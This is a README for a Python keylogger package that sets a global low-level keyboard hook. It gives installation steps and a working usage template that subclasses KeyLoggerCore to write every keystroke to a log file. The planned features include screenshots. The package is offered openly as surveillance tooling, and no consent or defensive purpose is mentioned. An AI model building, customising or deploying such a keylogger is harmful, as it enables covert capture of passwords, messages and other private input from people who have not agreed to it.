# Python-KeyLogger-Lib
A python package providing a multi-threaded keylogger by setting a global low-level keyboard hook in system.

## Why consider using this package ?
- Based on system hook, so you won't burn the CPU by GetAsyncKeyState() repeatdly
- Providing a clean and easy-to-use template for you to customize the behavior based on our structure.
- execute with a simple start(), and halt with a simple stop() method !!
- Non thread-blocking !!

## How to install ?
Download the project and extract it to your project base directory,  
so yout project directory shall look something like this: 
```
---------- YourLib/
    |
    ------ PyKeyLogger/
    |
    ------ setup.py
    |
    ------ your_main.py
```
then execute:
```
pip install .
```
on where the setup.py lies.

## How to use ?
After installing the library,  
you will need to subclass **KeyLoggerCore** to build your own keylogger like the folowing example:
```python
from PyKeyLogger import KeyLoggerCore

class MyKeyLogger(KeyLoggerCore):
  def __init__(self, logfile_path):
    super().__init__()
    self.logfile = logfile_path

  def _custom_callback(self, keypress: str) -> None:
    """ Override me for a custom callback upon hooking """
    # so for example of saving the keypress event to a custom file
    with open(self.logfile, "a+") as hdlr:
      hdlr.write(keypress)
```
Then, you can simply create an instance of your custom keylogger by calling:
```python
mylogger = MyKeyLogger("my_logfile.txt")
```
Start the keylogger by calling the **start()** method:
```python
mylogger.start()
```
Since it isn't thread-blocking,  
so you can stop it whenever you like by invoking the **stop()** method to halt it:
```python
mylogger.stop()
```

## To Do
1. Support system special keys
2. Support recognition on combination keys like Shift-[Char]
3. Adding more features like grabbing screen-focus or screenshot (? 
